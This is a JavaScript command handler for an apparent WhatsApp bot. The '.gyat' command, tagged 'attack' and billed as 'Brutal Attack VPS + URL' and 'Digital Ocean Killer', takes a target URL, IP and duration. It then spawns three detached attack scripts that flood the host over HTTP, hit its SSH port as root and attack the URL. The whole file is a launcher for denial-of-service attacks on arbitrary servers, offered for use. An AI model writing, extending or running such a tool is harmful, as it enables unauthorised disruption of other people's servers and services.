const { spawn } = require('child_process');
const handler = async (m, { args }) => {
    if (args.length < 3 | !args) {
        m.reply(`*Tunjukan Kekuatan Sigma Mewing Gyat Level 1000+ Dengan Bonus Rizzler Dan Beberapa Skibidi Bintang 5?*

\`\`\`[🔍] .gyat url ip duration\`\`\``);
        return;
    }

    const url = args[0];
    const username = 'root';
    const hostname = args[1];
    const duration = args[2];
    const port = '22';

    const ingfo = `\`Brutal Attack VPS + URL\`
\`Host:\` ${hostname}
\`Duration:\` ${duration} Seconds
\`Creator:\` PermenMD

#NonProxiedWebOnly`

    const cihuy = `*Digital Ocean Killer*
\`Someone Waking Up 10% Powers Of PermenMD From His Rest\`

${ingfo}`
conn.sendMessage(m.chat, { contextInfo: {
externalAdReply: {
showAdAttribution: true, 
title: global.title,
body: `Siapa Yang Membuat Mu Terpanggil King?`,
mediaType: 1,  
renderLargerThumbnail : true,
thumbnailUrl: global.brutall,
sourceUrl: ``
}}, text: cihuy}, {quoted: m})
    
    const command1 = spawn('node', [`./lib/PermenMD/StarsXRaw.js`, `http://${hostname}`, `${duration}`], { detached: true, stdio: 'ignore' });
    const command2 = spawn('node', ['./lib/PermenMD/StarsXSSH.js', `${hostname}`, `${port}`, `${username}`, `${duration}`], { detached: true, stdio: 'ignore' });
    const command3 = spawn('node', [`./lib/PermenMD/StarsXNinja.js`, `${url}`, `${duration}`], { detached: true, stdio: 'ignore' });

    command1.unref();
    command2.unref();
    command3.unref();
};

handler.tags = ['attack'];
handler.owner = true;
handler.help = ['gyat'];
handler.command = ['gyat']

module.exports = handler;
